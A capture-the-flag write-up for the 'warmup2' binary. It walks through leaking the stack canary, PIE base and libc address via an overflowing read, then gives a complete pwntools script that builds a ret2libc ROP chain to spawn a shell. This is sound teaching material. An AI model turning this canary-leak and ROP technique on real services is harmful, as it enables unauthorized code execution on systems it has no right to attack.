# warmup2

## Challenge

The challenge includes a binary with two text prompts.
Each prompt will repeat the string sent by the user.
At the end of both prompts, the program returns and exits.

The binary has full mitigations enabled.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Decompiled vuln function

```c
void sym.vuln(void) {
    int64_t in_FS_OFFSET;
    ulong buf;
    int64_t canary;
    
    canary = *(in_FS_OFFSET + 0x28);
    sym.imp.puts("What\'s your name?");
    sym.imp.read(0, &buf, 0x1337);
    sym.imp.printf("Hello %s!\n", &buf);
    sym.imp.puts("How old are you?");
    sym.imp.read(0, &buf, 0x1337);
    sym.imp.printf("Wow, I\'m %s too!\n", &buf);
    if (canary != *(in_FS_OFFSET + 0x28)) {
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

## Solution

The binary uses `read`, so no null byte is appended to user input.
We can leak the canary by writing up to its data so that the following `printf` call will print it to stdout.

On the next prompt, we need to restore the canary and loop the program so we can use the canary in an exploit.
We can do this by changing the least significant byte of the return address.

It is important to note that we cannot return back to the start of `main`, as the function prologue would create a new stack frame that is offset by 8 bytes.
This would cause the program to segfault in `printf` when it reaches a `movaps` instruction, which requires the stack to be aligned to 0x10 bytes.

Instead, we can jump back into `main` after the function prologue, which will cause it to use the existing stack frame rather than pushing a new one.

We can leak the libc address using the same technique as we use for the canary, except we are reading from the `libc_start_main_return` address on the stack.
Once we have this, and we loop again, we can use a ret2libc ropchain to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc-2.31.so')

io = start()

io.sendafter(b"What's your name?\n", flat({0x108: b'~'}))
io.recvuntil(b'~')
canary = unpack((b'\0' + io.recvuntil(b'!\n', drop=True))[0:8])
io.info("CANARY : " + hex(canary))

io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: b'\xa3'}))

io.sendafter(b"What's your name?\n", flat({0x117: b'~'}))
io.recvuntil(b'~')
exe.address = unpack(io.recvuntil(b'!\n', drop=True).ljust(8, b'\0')) - 0x000012e2
io.info("EXE : " + hex(exe.address))

rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.main()
io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: rop.chain()}))
io.recvuntil(b'!\n')
libc.address = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - libc.sym['puts']
io.info("LIBC : " + hex(libc.address))

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
io.sendlineafter(b"What's your name?\n", b"")
io.sendafter(b"How old are you?\n", flat({0x108: canary, 0x118: rop.chain()}))

io.interactive()
```

## Flag

```
maple{we_have_so_much_in_common}
```
